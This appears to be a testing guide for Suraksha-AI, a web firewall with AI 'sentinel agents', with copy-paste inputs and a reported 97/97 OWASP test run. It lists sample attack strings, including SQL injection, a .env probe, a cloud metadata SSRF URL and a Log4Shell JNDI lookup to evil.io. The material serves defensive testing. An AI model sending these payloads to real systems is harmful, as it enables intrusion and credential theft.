# Suraksha-AI: Simple Step-by-Step Testing Demonstration

> [!TIP]
> **Who is this for?** This guide is designed to be **simple, practical, and easy to follow**. You do not need deep security knowledge to test Suraksha-AI. Just follow the steps below to see the defense shield in action.

---

## 💡 How Suraksha-AI Works (Simple Analogy)

Think of your website as a secure building:
* **Normal Visitors** (like a customer entering the door) $\rightarrow$ Allowed inside (`200 OK - CLEAN`).
* **Attackers** (someone trying to pick a lock, sneak in through the window, or steal keys) $\rightarrow$ Caught at the gate by security guards (`403 FORBIDDEN - BLOCKED`).

The **AI Defense Agents** are your automated security guards. Each guard watches for a specific trick!

---

## 🚀 Way 1: Test Through the Website UI (Visual Test)

This is the easiest and most visual way to test.

### Step 1: Open the Multi-Threat Page
1. Make sure your project is running (using `run_project.bat`).
2. Open your web browser and go to:
   ```
   http://localhost:5173/multi-threat
   ```
3. You will see the **11 Active Sentinel Agents** on top and the **Scanner Configuration** on the left.

---

### Step 2: Try Test #1 — SQL Injection (Database Hack)

1. In the **Inspection Target / Input String** box on the left, copy and paste this exact text:
   ```sql
   ' OR '1'='1' --
   ```
2. Click the blue button: **RUN MULTI-THREAT AGENT SCAN**.
3. **What happens on your screen:**
   * A bright red badge appears: **BLOCKED & NEUTRALIZED (403)**
   * Threat Identified: **Injection** (OWASP `A03:2021`)
   * Intercepting Agent: **SQLi Deep Sentinel Agent**
   * Risk Score: **100 / 100**
   * *Meaning:* The attacker tried to trick the database login, but the SQL Sentinel recognized the trick and stopped it immediately!

---

### Step 3: Try Test #2 — Secret File Probe (Security Misconfiguration)

1. Clear the box and paste this:
   ```
   /.env
   ```
2. Click **RUN MULTI-THREAT AGENT SCAN**.
3. **What happens on your screen:**
   * Red badge: **BLOCKED & NEUTRALIZED (403)**
   * Threat Identified: **Security Misconfiguration** (OWASP `A05:2021`)
   * Intercepting Sentinel: **Hardening & Surface Shield Agent**
   * Risk Score: **95 / 100**
   * *Meaning:* Someone is probing your website to find secret passwords in `.env`. Suraksha-AI drops the connection so your secrets stay safe!

---

### Step 4: Try Test #3 — Stealing Cloud Keys (SSRF Attack)

1. Clear the box and paste this:
   ```
   http://169.254.169.254/latest/meta-data/
   ```
2. Click **RUN MULTI-THREAT AGENT SCAN**.
3. **What happens on your screen:**
   * Red badge: **BLOCKED & NEUTRALIZED (403)**
   * Threat Identified: **Server-Side Request Forgery (SSRF)** (OWASP `A10:2021`)
   * Intercepting Sentinel: **SSRF Egress Firewall Agent**
   * Risk Score: **100 / 100**
   * *Meaning:* The attacker tried to steal AWS/Google Cloud server credentials. The SSRF Firewall blocked the outgoing request.

---

### Step 5: Try Test #4 — Normal, Safe User (Zero False Positives)

1. Clear the box and paste a normal email address:
   ```
   alex.developer@mycompany.com
   ```
2. Click **RUN MULTI-THREAT AGENT SCAN**.
3. **What happens on your screen:**
   * A green badge appears: **CLEAN & FORWARDED (200)**
   * Threat Identified: **Safe**
   * Risk Score: **0.0 / 100**
   * *Meaning:* Real customers are never blocked. Only bad traffic is stopped!

---

## 📋 Copy-Paste Testing Cheatsheet

Here is a quick cheat sheet of 10 tests you can copy and paste one by one into the web UI:

| # | What Attack You Are Testing | What to Copy & Paste | Which Sentinel Catches It | Result on Screen |
|---|---|---|---|---|
| 1 | **Stealing Invoices (IDOR)** | `/api/users/1245/invoice` | **Auth & Access Guardian** | 🔴 BLOCKED (403) |
| 2 | **Sending Password in Plain Text** | `http://mysite.com/login?password=123` | **CryptoGuard Agent** | 🔴 BLOCKED (403) |
| 3 | **Database Hack (SQL Injection)** | `' OR 1=1 --` | **SQLi Deep Sentinel** | 🔴 BLOCKED (403) |
| 4 | **Cheating Store Prices (Negative Qty)** | `quantity=-5&price=0.01` | **Business Logic Armor** | 🔴 BLOCKED (403) |
| 5 | **Searching for Secret Files** | `/.env` | **Hardening Shield Agent** | 🔴 BLOCKED (403) |
| 6 | **Log4Shell RCE (Known Exploit)** | `${jndi:ldap://evil.io/a}` | **Supply Chain Sentry** | 🔴 BLOCKED (403) |
| 7 | **Hacker Password Guessing** | `admin:123456` | **Identity Assurance Sentinel**| 🔴 BLOCKED (403) |
| 8 | **Java Malicious Code (Deserialization)** | `rO0ABXNyABFqYXZh` | **Data Integrity Guardian** | 🔴 BLOCKED (403) |
| 9 | **Automated Hacker Scanner** | `User-Agent: sqlmap/1.7` | **Audit & Telemetry Sentry** | 🔴 BLOCKED (403) |
| 10 | **Cloud Metadata Theft (SSRF)** | `http://169.254.169.254/` | **SSRF Egress Firewall** | 🔴 BLOCKED (403) |
| 11 | **Normal User (Benign Data)** | `hello@world.com` | **Suraksha Grid** | 🟢 ALLOWED (200) |

---

## ⚡ Way 2: Run the 1-Second Terminal Benchmark

If you want to test all 97 attacks at once in 3 seconds, run this single command in your PowerShell / Command Prompt:

```powershell
python test_owasp_top10_suite.py
```

### What You Will See in the Terminal:
```text
================================================================================
 SURAKSHA-AI: OWASP TOP 10 (2021) 97-VECTOR TEST & COMPLIANCE RUNNER
================================================================================
 A01:2021 - Broken Access Control                        : 13/13 (100.0%)
 A02:2021 - Cryptographic Failures                       :  8/ 8 (100.0%)
 A03:2021 - Injection                                    : 28/28 (100.0%)
 A04:2021 - Insecure Design                              :  8/ 8 (100.0%)
 A05:2021 - Security Misconfiguration                    :  9/ 9 (100.0%)
 A06:2021 - Vulnerable and Outdated Components           :  6/ 6 (100.0%)
 A07:2021 - Identification and Authentication Failures   :  7/ 7 (100.0%)
 A08:2021 - Software and Data Integrity Failures         :  6/ 6 (100.0%)
 A09:2021 - Security Logging and Monitoring Failures     :  5/ 5 (100.0%)
 A10:2021 - Server-Side Request Forgery (SSRF)           :  7/ 7 (100.0%)
================================================================================
 OVERALL RESULT: 97/97 Passed (100.0%)
================================================================================
```

---

## 🎯 Summary of What This Proves

1. **Every attack type is blocked** with an HTTP `403 Forbidden` response.
2. **Every attack is caught by the correct specialist agent** (e.g., SQL attacks caught by SQL Sentinel, `.env` caught by Hardening Sentinel).
3. **Normal user inputs pass safely** with HTTP `200 OK` (no false alarms).
